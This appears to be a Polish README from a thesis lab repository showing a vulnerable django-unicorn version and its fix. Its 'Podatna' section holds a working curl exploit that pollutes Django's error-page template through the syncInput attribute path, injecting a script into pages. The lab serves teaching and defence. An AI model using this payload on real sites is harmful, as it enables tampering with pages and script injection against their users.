# A06-2021/Improperly-Controlled-Modification-of-Dynamically-Determined-Object-Attributes

## Uruchomienie

Aby uruchomić aplikację lokalnie za pomocą Dockera, najpierw musimy pobrać repozytorium za pomocą polecenia:

```bash
git clone https://github.com/jopyslaw/Magisterka-URZ
```
Kolejnym krokiem jest wejście do pobranego repozytorium, używając komendy:

```bash
cd Magister-URZ
```

Następnie za pomocą komendy

```git
git checkout 'A06-2021/Improperly-Controlled-Modification-of-Dynamically-Determined-Object-Attributes'
```

Przełączyć się na odpowieni branch, który zawiera opisywany przykład.

Ostatnim krokiem jest zbudowanie kontenera za pomocą komendy:

```bash
docker compose up --build
```

Aplikacja po zbudowaniu jest dostępna pod adresem:

```bash
http://localhost:8000
```

## Podatna

Wejść pod adres:
```bash
http://localhost:8000/api/profile/
```

Za pomocą narzędzi deweloperskich trzeba pobrać wartość tokena CSRF, ciasteczko CSRF oraz z tagu div który posiada atrybut unicord:id jego wartość i wkleić do poniższego żadania

Wysłać za pomocą curla następujące żądanie:
```bash
curl -X POST http://localhost:8000/unicorn/message/profile_card/ \
  -H "Content-Type: application/json" \
  -H "X-CSRFToken: TUTAJ_WSTAW_TOKEN" \
  -H "Cookie: csrftoken=TUTAJ_WSTAW_TOKEN" \
  -d '{
    "id": "TUTAJ WSTAW ID KOMPONENTU POBRANEGO ZE STRONY INTERNETOWEJ",
    "actionQueue": [
      {
        "type": "syncInput",
        "payload": {
          "name": "__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE",
          "value": "<html><script>alert(\'error page pollution\')</script></html>"
        }
      }
    ],
    "data": {
      "name": "Jan",
      "role": "User"
    },
    "epoch": "123",
    "checksum": "G38efjJS"
  }'
```

Wejść pod adres:
```bash
http://localhost:8000/api/profile/nie-istnieje
```

## Zabezpieczona

Wejść w plik requirements.txt i zmienić następującą linie:
```bash
django-unicorn==0.59.0
```
na
```bash
django-unicorn
```

Zbudować kontener za pomocą komendy:

```bash
docker compose up --build
```


Powtórzyć operacje opisaną w zakładce "Podatna"
